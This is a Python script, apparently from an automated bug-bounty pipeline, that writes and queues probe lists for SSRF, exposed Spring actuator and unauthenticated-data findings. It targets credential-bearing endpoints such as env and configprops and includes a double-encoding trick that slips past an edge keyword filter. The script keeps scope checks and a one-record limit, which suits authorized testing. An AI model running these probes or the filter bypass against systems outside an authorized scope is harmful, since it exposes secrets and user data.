#!/usr/bin/env python3
"""auto-lane.py - write and queue an OpenCode lane for every TIER-2/3 escalation, so the GPU works the bot's finds.

  auto-lane.py <program>          make lanes for new TIER-2/3 escalations of the program and queue them
  auto-lane.py --all              same, for every program in escalations.jsonl

Each lane is targets/<p>/hunts/auto-lane-<slug>/ with BRIEF.md (short, with the KILL BYTE), PROBES.txt (one
`TAG|command` per line for scripts/opencode-lane.sh) and p.py (the lane harness: scope-checked against SCOPE.txt, saves
raw/<TAG>.req/.resp, appends commands.txt). GET only. Templates by escalation class:
  ssrf-reach    same internal host through the same URL param: credential-bearing paths, plain and double-encoded,
                plus the refusal control (external URL) and a nonsense internal path
  unauth-data   stability re-fire + the parent collection with a ONE-record limit (minimal sample, never bulk)
  config        credential-bearing siblings of an exposed management endpoint (env, configprops, mappings, ...)
  id-keyed      NO lane: needs two owned accounts -> one NEEDS line in the orch inbox instead
Made lanes are recorded in .claude/state/orch/lanes-made.json so one escalation never yields two lanes.
"""
import json
import os
import re
import shutil
import sys
from datetime import datetime, timezone
from urllib.parse import parse_qsl, quote, urlencode, urlparse, urlunparse

WS = (os.environ.get("GNOC_WORKSPACE") or os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
ORCH = os.path.join(WS, ".claude/state/orch")
HARNESS = os.path.join(WS, "targets/program-60/hunts/calllog-api-20261020/p.py")  # generic, scope-checked
CRED_PATHS = ["env", "configprops", "mappings", "beans", "loggers", "info", "health", "metrics", "conditions", "scheduledtasks"]
URL_PARAMS = ("url", "uri", "target", "dest", "destination", "proxy", "link", "feed")


def now():
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")


def dbl(word):
    """double-encode the first letter: the Akamai edge keyword filter misses it, Spring decodes it (motel6 receipt)"""
    return "%25" + format(ord(word[0]), "02x") + word[1:]


def probes_ssrf(esc_url):
    p = urlparse(esc_url)
    q = parse_qsl(p.query, keep_blank_values=True)
    k = next((i for i, (n, _) in enumerate(q) if n.lower() in URL_PARAMS), None)
    if k is None:
        return []
    inner = urlparse(q[k][1])
    base_path = re.sub(r"/[^/]*$", "", inner.path)  # parent of the reached path, e.g. /%2561ctuator

    def outer(inner_url):
        qq = list(q)
        qq[k] = (qq[k][0], inner_url)
        # '%' is re-encoded, so a single-encoded inner keyword (%61ctuator) leaves as %2561ctuator, exactly like the
        # request that worked (the edge decodes once and sees no keyword; the internal app decodes the rest)
        return urlunparse((p.scheme, p.netloc, p.path, "", urlencode(qq, safe=""), ""))

    out = [("c00-refusal", outer("https://example.com/")),
           ("c01-nonsense", outer(f"{inner.scheme}://{inner.netloc}{base_path}/gnoc-nonexistent")),
           ("c02-reached", esc_url)]
    for i, w in enumerate(CRED_PATHS):
        out.append((f"p{i:02d}-{w}", outer(f"{inner.scheme}://{inner.netloc}{base_path}/{w}")))
        out.append((f"d{i:02d}-{w}", outer(f"{inner.scheme}://{inner.netloc}{base_path}/%{ord(w[0]):02x}{w[1:]}")))
    return out


def probes_config(esc_url):
    p = urlparse(esc_url)
    parent = re.sub(r"/[^/]*$", "", p.path)
    out = [("c00-reached", esc_url),
           ("c01-nonsense", urlunparse((p.scheme, p.netloc, parent + "/gnoc-nonexistent", "", "", "")))]
    for i, w in enumerate(CRED_PATHS):
        out.append((f"p{i:02d}-{w}", urlunparse((p.scheme, p.netloc, f"{parent}/{w}", "", "", ""))))
        out.append((f"d{i:02d}-{w}", urlunparse((p.scheme, p.netloc, f"{parent}/{dbl(w)}", "", "", ""))))
    return out


def probes_data(esc_url):
    p = urlparse(esc_url)
    parent = re.sub(r"/[^/]*/?$", "", p.path) or "/"
    out = [("c00-reached", esc_url), ("c01-refire", esc_url),
           ("c02-nonsense", urlunparse((p.scheme, p.netloc, parent + "/gnoc-nonexistent", "", "", "")))]
    for i, lim in enumerate(("limit=1", "size=1", "per_page=1", "pageSize=1", "first=1")):
        out.append((f"m{i:02d}-collection-{lim.split('=')[0]}", urlunparse((p.scheme, p.netloc, parent, "", lim, ""))))
    return out


def classify(rec, text):
    if rec.get("id_keyed"):
        return "id-keyed"
    if re.search(r"[?&](" + "|".join(URL_PARAMS) + r")=", "?" + (urlparse(rec["url"]).query or ""), re.I) \
            and (rec.get("internal", 0) or "internal/config markers: none" not in text):
        return "ssrf-reach"
    if rec.get("pii") or rec.get("secrets"):
        return "unauth-data"
    return "config"


BRIEF = """# LANE BRIEF: {program} / {lane} (auto-written by auto-lane.py from a {tier} escalation, {ts})

Escalation: {esc_rel}/ESCALATION.md   class: {cls}
Reached URL: {url}
HARNESS (every request goes through it; it refuses out-of-scope hosts and saves raw/<TAG>.req/.resp):
  HUNT_TARGET={program} N=1500 /usr/bin/python3 {lanedir}/p.py <TAG> GET '<URL>'
GOAL: turn the escalation into a filable terminal. {goal}
KILL BYTE: {kill}
Controls first (c* tags). A response equal to a control is NOT a hit. GET only. One record max, never bulk.
Run each line exactly, print its output, stop. Do not interpret.
"""
GOALS = {
    "ssrf-reach": ("Find a credential-bearing internal endpoint reachable through the same URL parameter.",
                   "a 200 whose body carries property names with values (datasource, password, secret, key, token), "
                   "distinct from c00 (refusal) and c01 (nonsense)."),
    "config": ("Find a credential-bearing sibling of the exposed management endpoint.",
               "a 200 whose body carries property names with values (datasource, password, secret, key, token), "
               "distinct from c01 (nonsense)."),
    "unauth-data": ("Show the exposure is a collection, with ONE record as the minimal sample.",
                    "a 200 collection response returning one record that carries user-data fields, distinct from c02."),
}


def make(program, rec):
    esc_dir = os.path.join(WS, rec["dir"])
    text = open(os.path.join(esc_dir, "ESCALATION.md")).read() if os.path.isfile(os.path.join(esc_dir, "ESCALATION.md")) else ""
    cls = classify(rec, text)
    if cls == "id-keyed":
        with open(os.path.join(ORCH, "INBOX.md"), "a") as f:
            f.write(f"- [{now()}] **NEEDS** {program} {rec['url']} is id-keyed (IDOR candidate): needs two OWNED accounts for "
                    f"the cross-user proof; no auto-lane written ({rec['dir']}/ESCALATION.md)\n")
        return None
    probes = {"ssrf-reach": probes_ssrf, "config": probes_config, "unauth-data": probes_data}[cls](rec["url"])
    if not probes:
        return None
    slug = os.path.basename(rec["dir"])[:60]
    lane = f"auto-lane-{slug}"
    lanedir = os.path.join(WS, "targets", program, "hunts", lane)
    os.makedirs(os.path.join(lanedir, "raw"), exist_ok=True)
    shutil.copy(HARNESS, os.path.join(lanedir, "p.py"))
    goal, kill = GOALS[cls]
    with open(os.path.join(lanedir, "BRIEF.md"), "w") as f:
        f.write(BRIEF.format(program=program, lane=lane, tier=rec["verdict"], ts=now(), esc_rel=rec["dir"], cls=cls,
                             url=rec["url"], lanedir=lanedir, goal=goal, kill=kill))
    with open(os.path.join(lanedir, "PROBES.txt"), "w") as f:
        f.write(f"# auto-lane {cls} from {rec['dir']}\n")
        for tag, u in probes:
            safe_u = u.replace("'", "%27")
            f.write(f"{tag}|HUNT_TARGET={program} N=1500 /usr/bin/python3 {lanedir}/p.py {tag} GET '{safe_u}'\n")
    with open(os.path.join(ORCH, "queue.txt"), "a") as f:
        f.write(f"{program}|{lane}|{os.path.relpath(os.path.join(lanedir, 'BRIEF.md'), WS)}|"
                f"{os.path.relpath(os.path.join(lanedir, 'PROBES.txt'), WS)}|A\n")
    with open(os.path.join(ORCH, "INBOX.md"), "a") as f:
        f.write(f"- [{now()}] **AUTO-LANE** {program} {cls} lane queued for the GPU worker: {len(probes)} probes, "
                f"{os.path.relpath(lanedir, WS)}/BRIEF.md\n")
    return lane


def main(argv):
    if not argv or argv[0] in ("-h", "--help"):
        print(__doc__)
        return 0
    os.makedirs(ORCH, exist_ok=True)
    made_path = os.path.join(ORCH, "lanes-made.json")
    try:
        made = set(json.load(open(made_path)))
    except (OSError, ValueError):
        made = set()
    recs = []
    jl = os.path.join(ORCH, "escalations.jsonl")
    for ln in open(jl) if os.path.isfile(jl) else []:
        try:
            r = json.loads(ln)
        except ValueError:
            continue
        if r.get("tier", 0) >= 2 and (argv[0] == "--all" or r.get("program") == argv[0]):
            recs.append(r)
    n = 0
    for r in recs:
        key = r["program"] + "|" + r["url"]
        if key in made:
            continue
        lane = make(r["program"], r)
        made.add(key)
        if lane:
            n += 1
            print(f"queued {r['program']}/{lane}")
    with open(made_path, "w") as f:
        json.dump(sorted(made), f)
    print(f"{n} lane(s) queued")
    return 0


if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))
